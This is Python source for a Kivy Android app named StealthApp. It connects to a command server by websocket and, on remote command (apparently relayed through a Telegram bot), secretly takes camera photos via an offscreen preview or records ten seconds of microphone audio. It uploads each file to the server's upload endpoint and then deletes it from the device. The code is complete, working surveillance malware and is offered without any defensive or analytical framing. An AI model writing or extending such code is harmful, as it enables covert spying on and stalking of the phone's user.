import asyncio
import os
import threading
import websockets
import aiohttp
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.utils import platform

WS_URL = "ws://192.168.0.111:8000/ws/device"
UPLOAD_URL = "http://192.168.0.111:8000/upload"

status_label = None

def update_status(text):
    global status_label
    if status_label:
        status_label.text = text

async def ws_loop():
    while True:
        try:
            update_status("Serverga ulanilmoqda...\n" + WS_URL)
            async with websockets.connect(WS_URL, ping_interval=20, ping_timeout=20) as ws:
                update_status("✅ Ulandi!\nTelegram botdan buyruq bering.")
                while True:
                    msg = await ws.recv()
                    update_status(f"Buyruq keldi: {msg}")
                    if msg == "take_photo":
                        await take_photo_and_upload()
                    elif msg == "record_audio":
                        await record_audio_and_upload()
        except Exception as e:
            update_status(f"❌ Xatolik:\n{e}\n5 soniyadan so'ng qayta...")
            await asyncio.sleep(5)

async def take_photo_and_upload():
    if platform == 'android':
        try:
            from jnius import autoclass
            mService = autoclass('org.kivy.android.PythonActivity').mActivity
            Camera = autoclass('android.hardware.Camera')
            SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
            FileOutputStream = autoclass('java.io.FileOutputStream')

            filepath = "/sdcard/stealth_capture.jpg"
            camera = Camera.open(0)
            texture = SurfaceTexture(10)
            camera.setPreviewTexture(texture)
            camera.startPreview()

            done = [False]
            photo_path = [None]

            from jnius import PythonJavaClass, java_method
            class PicCb(PythonJavaClass):
                __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
                __javacontext__ = 'app'
                @java_method('([BLandroid/hardware/Camera;)V')
                def onPictureTaken(self, data, cam):
                    fos = FileOutputStream(filepath)
                    fos.write(data)
                    fos.close()
                    photo_path[0] = filepath
                    cam.release()
                    done[0] = True

            cb = PicCb()
            camera.takePicture(None, None, cb)

            for _ in range(20):
                if done[0]:
                    break
                await asyncio.sleep(0.5)

            if photo_path[0] and os.path.exists(photo_path[0]):
                await upload_media(photo_path[0], "photo")
                update_status("✅ Rasm yuborildi!")
        except Exception as e:
            update_status(f"Kamera xatolik: {e}")

async def record_audio_and_upload():
    if platform == 'android':
        try:
            from jnius import autoclass
            MediaRecorder = autoclass('android.media.MediaRecorder')
            AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
            OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
            AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

            filepath = "/sdcard/stealth_audio.m4a"
            recorder = MediaRecorder()
            recorder.setAudioSource(AudioSource.MIC)
            recorder.setOutputFormat(OutputFormat.MPEG_4)
            recorder.setAudioEncoder(AudioEncoder.AAC)
            recorder.setOutputFile(filepath)
            recorder.prepare()
            recorder.start()
            update_status("🎙 Yozilmoqda (10 sek)...")
            await asyncio.sleep(10)
            recorder.stop()
            recorder.release()
            if os.path.exists(filepath):
                await upload_media(filepath, "audio")
                update_status("✅ Ovoz yuborildi!")
        except Exception as e:
            update_status(f"Mikrofon xatolik: {e}")

async def upload_media(file_path, media_type):
    try:
        async with aiohttp.ClientSession() as session:
            with open(file_path, 'rb') as f:
                data = aiohttp.FormData()
                data.add_field('file', f, filename=os.path.basename(file_path))
                data.add_field('media_type', media_type)
                async with session.post(UPLOAD_URL, data=data) as resp:
                    print("Upload:", resp.status)
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        print(f"Upload xatolik: {e}")

def run_async_loop():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(ws_loop())

class StealthApp(App):
    def build(self):
        global status_label
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.INTERNET,
                Permission.WAKE_LOCK,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.RECORD_AUDIO,
            ])

        layout = BoxLayout(orientation='vertical')
        status_label = Label(
            text="Ishga tushirilmoqda...",
            font_size='18sp'
        )
        layout.add_widget(status_label)

        # WebSocket loop ni alohida threadda ishga tushirish
        t = threading.Thread(target=run_async_loop, daemon=True)
        t.start()

        return layout

if __name__ == '__main__':
    StealthApp().run()
